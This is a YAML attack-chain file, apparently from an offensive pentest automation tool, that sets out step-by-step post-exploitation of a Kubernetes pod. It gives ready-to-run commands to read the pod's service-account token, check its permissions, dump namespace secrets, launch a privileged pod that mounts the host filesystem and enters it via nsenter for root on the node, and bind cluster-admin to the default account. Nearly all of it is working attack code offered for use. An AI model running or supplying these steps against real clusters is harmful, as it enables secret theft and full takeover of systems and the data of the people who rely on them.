id: kubernetes-pod-escape
name: "Cloud — Kubernetes pod token → API → node breakout"
description: >
  RCE inside a pod gives you the pod's service-account token at
  /var/run/secrets/kubernetes.io/serviceaccount/token. Hit the API
  server, list permissions, escalate to a privileged namespace or
  break out to the host node.
tags: [cloud, kubernetes, container-escape, post-exploitation]
difficulty: hard

inputs: []

steps:
  - id: harvest_token
    name: "Extract the pod's service-account token"
    inline_command: |
      cat /var/run/secrets/kubernetes.io/serviceaccount/token
      cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
      cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
      env | grep KUBERNETES
    capture:
      - var: sa_token
        regex: '^(eyJ[A-Za-z0-9._-]+)$'
        match: first
      - var: namespace
        regex: '^([a-z][a-z0-9-]+)$'
        match: first

  - id: api_url
    name: "Find the API server"
    inline_command: "echo \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\""
    notes: |
      Usually 10.96.0.1:443 inside the pod network. Reachable from any
      pod by default unless NetworkPolicy says otherwise.

  - id: list_permissions
    name: "What can this token do? (SelfSubjectAccessReview)"
    inline_command: |
      curl -sk \
        -H "Authorization: Bearer $TOKEN" \
        -X POST \
        -H 'Content-Type: application/json' \
        --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"<ns>","verb":"create","resource":"pods"}}}' \
        https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
    notes: |
      Or use the kubectl auth plugin if you can drop a static binary:
        kubectl auth can-i --list -n <ns>
      Look specifically for: create pods, get/list secrets, create
      rolebindings, escalate, impersonate.

  - id: pillage_secrets
    name: "If you can read secrets — pillage them"
    inline_command: |
      curl -sk -H "Authorization: Bearer $TOKEN" \
        https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets

  - id: privileged_pod_breakout
    name: "Create a privileged pod that mounts host filesystem → root on node"
    inline_command: |
      cat > /tmp/privpod.yaml <<'EOF'
      apiVersion: v1
      kind: Pod
      metadata: { name: pwned, namespace: <ns> }
      spec:
        hostPID: true
        containers:
        - name: pwn
          image: alpine
          command: ["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh"]
          securityContext: { privileged: true }
          volumeMounts: [{ name: host, mountPath: /host }]
        volumes: [{ name: host, hostPath: { path: / } }]
      EOF
      kubectl --token=$TOKEN apply -f /tmp/privpod.yaml -n <ns>
      kubectl --token=$TOKEN exec -it pwned -n <ns> -- sh
    notes: |
      You're now root on the underlying node. If it's a control-plane
      node → cluster takeover. If it's just a worker → use the kubelet
      kubeconfig at /etc/kubernetes/kubelet.conf to talk to the API as
      that node (often has wider access).

  - id: rbac_escalate
    name: "If you have `escalate` permission — create a cluster-admin binding"
    inline_command: |
      cat > /tmp/binding.yaml <<'EOF'
      apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRoleBinding
      metadata: { name: pwned-admin }
      roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
      subjects: [{ kind: ServiceAccount, name: default, namespace: <ns> }]
      EOF
      kubectl --token=$TOKEN apply -f /tmp/binding.yaml

references:
  - title: "Kubernetes security cheatsheet"
    url:   "https://book.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html"
  - title: "Bishop Fox — Kubernetes attack matrix"
    url:   "https://www.bishopfox.com/blog/kubernetes-pod-escape-using-log-mounts"

next_chains:
  - chain: shell-stabilization
    when:   'broke out to a node shell'
    reason: 'Stabilize before pivoting further.'
  - chain: linux-priv-esc-recon
    when:   'on the node now'
    reason: 'Standard Linux PE recon on the worker / control-plane node.'
